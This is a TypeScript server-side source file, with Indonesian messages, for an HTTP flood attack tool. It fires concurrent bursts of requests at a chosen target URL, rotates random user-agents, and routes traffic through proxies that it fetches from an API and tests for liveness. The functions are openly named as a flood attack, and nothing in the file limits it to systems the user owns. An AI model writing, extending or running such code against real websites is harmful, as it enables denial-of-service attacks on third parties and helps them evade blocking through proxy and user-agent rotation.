
"use server";

import { HttpsProxyAgent } from "https-proxy-agent";
import { USER_AGENTS } from "@/lib/user-agents";

export interface FloodStats {
  totalSent: number;
  successful: number;
  failed: number;
  error?: string;
  statusCodeCounts?: Record<number, number>;
}

const METHODS_WITHOUT_BODY = ["GET", "HEAD", "DELETE", "OPTIONS"];
const PROXY_TEST_URL = "https://www.google.com/generate_204"; 
const PROXY_TEST_TIMEOUT_MS = 7000; 
const CONCURRENT_PROXY_CHECKS = 10;


export async function startFloodAttack(
  targetUrl: string,
  method: string,
  headersString?: string,
  body?: string,
  concurrency?: number,
  rate?: number,
  durationInSeconds?: number,
  proxiesString?: string
): Promise<FloodStats> {
  let parsedUrl: URL;
  try {
    parsedUrl = new URL(targetUrl);
  } catch (e) {
    return { totalSent: 0, successful: 0, failed: 0, error: "URL target tidak valid. Harap sertakan skema (mis., http:// atau https://)." };
  }

  if (parsedUrl.protocol !== "http:" && parsedUrl.protocol !== "https:") {
     return { totalSent: 0, successful: 0, failed: 0, error: "URL target harus menggunakan protokol http atau https." };
  }
  
  const safeConcurrency = Math.min(Math.max(1, concurrency ?? 50), 500); 
  const safeRate = Math.min(Math.max(1, rate ?? 50), 500);
  const safeDuration = Math.min(Math.max(5, durationInSeconds ?? 10), 60);

  if (safeConcurrency <= 0 || safeRate <= 0 || safeDuration <=0) {
    return { totalSent: 0, successful: 0, failed: 0, error: "Konkurensi, tingkat, dan durasi harus bernilai positif." };
  }

  const parsedHeaders: HeadersInit = {};
  let customUserAgentProvided = false;
  if (headersString) {
    headersString.split('\n').forEach(line => {
      const parts = line.split(':');
      if (parts.length >= 2) {
        const key = parts[0].trim();
        const value = parts.slice(1).join(':').trim();
        if (key && value) {
          parsedHeaders[key] = value;
          if (key.toLowerCase() === 'user-agent') {
            customUserAgentProvided = true;
          }
        }
      }
    });
  }

  const baseFetchOptions: RequestInit = {
    method: method.toUpperCase(),
    signal: AbortSignal.timeout(5000) 
  };

  if (body && !METHODS_WITHOUT_BODY.includes(method.toUpperCase())) {
    baseFetchOptions.body = body;
    
    const hasContentType = Object.keys(parsedHeaders).some(key => key.toLowerCase() === 'content-type');
    if (!hasContentType) {
        try {
            JSON.parse(body);
            parsedHeaders['Content-Type'] = 'application/json';
        } catch (e) {
            parsedHeaders['Content-Type'] = 'text/plain';
        }
    }
  }

  let parsedProxies: string[] = [];
  if (proxiesString) {
    parsedProxies = proxiesString
      .split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0 && !line.startsWith("http://") && !line.startsWith("https://"));

    if (parsedProxies.length === 0 && proxiesString.trim().length > 0) {
        return { totalSent: 0, successful: 0, failed: 0, error: "Tidak ada string proksi yang valid yang dapat diurai. Periksa format (mis., host:port atau IP:PORT)." };
    }
  }


  let totalSent = 0;
  let successful = 0;
  let failed = 0;
  const statusCodeCounts: Record<number, number> = {};
  const startTime = Date.now();
  const endTime = startTime + safeDuration * 1000;

  console.log(`Mulai banjir: ${method} ${targetUrl}, Konkurensi: ${safeConcurrency}, Tingkat: ${safeRate} RPS, Durasi: ${safeDuration}d, Proksi: ${parsedProxies.length}`);

  try {
    while (Date.now() < endTime) {
      const batchStartTime = Date.now();
      const requestsInBatch: Promise<void>[] = [];
      
      const numRequestsThisBurst = safeConcurrency;

      for (let i = 0; i < numRequestsThisBurst; i++) {
        if (Date.now() >= endTime) break;

        let currentFetchOptions = { ...baseFetchOptions };
        const currentHeaders = {...parsedHeaders};

        if (!customUserAgentProvided && USER_AGENTS.length > 0) {
            currentHeaders['User-Agent'] = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        }
        currentFetchOptions.headers = currentHeaders;


        if (parsedProxies.length > 0) {
          const proxyConfig = parsedProxies[totalSent % parsedProxies.length];
          try {
            const agent = new HttpsProxyAgent(proxyConfig); 
            currentFetchOptions.agent = agent as any; 
          } catch (e) {
            console.error(`Error creating proxy agent for ${proxyConfig}:`, e);
            failed++;
            statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; 
            totalSent++; 
            continue; 
          }
        }

        requestsInBatch.push(
          fetch(targetUrl, currentFetchOptions) 
            .then(response => {
              const status = response.status;
              statusCodeCounts[status] = (statusCodeCounts[status] || 0) + 1;
              
              if (response.status >= 200 && response.status < 400) { 
                successful++;
              } else {
                failed++;
              }
            })
            .catch((e: any) => {
              failed++;
              if (e.name === 'AbortError' || e.name === 'TimeoutError') {
                 statusCodeCounts[0] = (statusCodeCounts[0] || 0) + 1; 
              } else {
                 statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; 
              }
            })
            .finally(() => {
              totalSent++;
            })
        );
      }
      
      await Promise.allSettled(requestsInBatch);

      if (Date.now() >= endTime) break;

      const batchDurationMs = Date.now() - batchStartTime;
      const targetBatchIntervalMs = (numRequestsThisBurst / safeRate) * 1000;
      const delayMs = Math.max(0, targetBatchIntervalMs - batchDurationMs);
      
      if (delayMs > 0) {
        await new Promise(resolve => setTimeout(resolve, delayMs));
      }
    }
  } catch (e: any) {
    console.error("Kesalahan serangan banjir:", e);
    return { totalSent, successful, failed, statusCodeCounts, error: e.message || "Terjadi kesalahan tak terduga selama banjir." };
  } finally {
    console.log(`Banjir berakhir: Total Terkirim: ${totalSent}, Berhasil: ${successful}, Gagal: ${failed}, Kode Status: ${JSON.stringify(statusCodeCounts)}`);
  }

  return { totalSent, successful, failed, statusCodeCounts };
}

export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: string; error?: string }> {
  if (!apiUrl.trim()) {
    return { error: "URL API tidak boleh kosong." };
  }
  try {
    new URL(apiUrl);
  } catch (e) {
    return { error: "Format URL API tidak valid. Harap sertakan skema (mis., http:// atau https://)." };
  }

  try {
    const response = await fetch(apiUrl, { 
      signal: AbortSignal.timeout(10000), 
      headers: { 'Accept': 'text/plain' } 
    }); 
    if (!response.ok) {
      return { error: `Permintaan API gagal dengan status ${response.status}: ${response.statusText}` };
    }
    const text = await response.text();
    if (!text.trim()) {
      return { error: "API mengembalikan daftar proksi kosong." };
    }
    
    const lines = text.trim().split('\n');
    const strippedLines = lines.map(line => line.trim().replace(/^(http(s)?:\/\/)/i, ''));
    
    return { proxies: strippedLines.join('\n') };
  } catch (e: any) {
    console.error("Kesalahan mengambil proksi dari API:", e);
    if (e.name === 'TimeoutError') {
        return { error: "Waktu permintaan API habis." };
    }
    return { error: e.message || "Gagal mengambil proksi. Periksa konsol browser untuk detail lebih lanjut." };
  }
}


export async function checkProxies(proxiesString: string): Promise<{
  liveProxiesString: string;
  liveCount: number;
  deadCount: number;
  totalChecked: number;
  error?: string;
}> {
  if (!proxiesString || proxiesString.trim() === "") {
    return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0 };
  }

  const proxyEntries = proxiesString.split('\n')
    .map(line => line.trim())
    .filter(line => line.length > 0 && !line.startsWith("http://") && !line.startsWith("https://")); 

  if (proxyEntries.length === 0) {
    return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0, error: "Tidak ada proksi dalam format host:port yang benar ditemukan untuk diperiksa. Pastikan skema http(s):// telah dihapus." };
  }

  const liveProxiesArray: string[] = [];
  let deadCount = 0;

  const checkSingleProxy = async (proxyUrl: string): Promise<boolean> => { 
    try {
      const agent = new HttpsProxyAgent(proxyUrl); 
      const response = await fetch(PROXY_TEST_URL, {
        agent: agent as any,
        signal: AbortSignal.timeout(PROXY_TEST_TIMEOUT_MS),
        redirect: 'manual', 
      });
      return response.status === 204 || response.status === 200;
    } catch (error: any) {
      return false;
    }
  };

  for (let i = 0; i < proxyEntries.length; i += CONCURRENT_PROXY_CHECKS) {
    const batch = proxyEntries.slice(i, i + CONCURRENT_PROXY_CHECKS);
    const results = await Promise.allSettled(
      batch.map(proxy => checkSingleProxy(proxy).then(isLive => ({ proxy, isLive })))
    );

    results.forEach(result => {
      if (result.status === 'fulfilled') {
        if (result.value.isLive) {
          liveProxiesArray.push(result.value.proxy);
        } else {
          deadCount++;
        }
      } else {
        deadCount++;
      }
    });
  }

  return {
    liveProxiesString: liveProxiesArray.join('\n'),
    liveCount: liveProxiesArray.length,
    deadCount: deadCount,
    totalChecked: proxyEntries.length,
  };
}
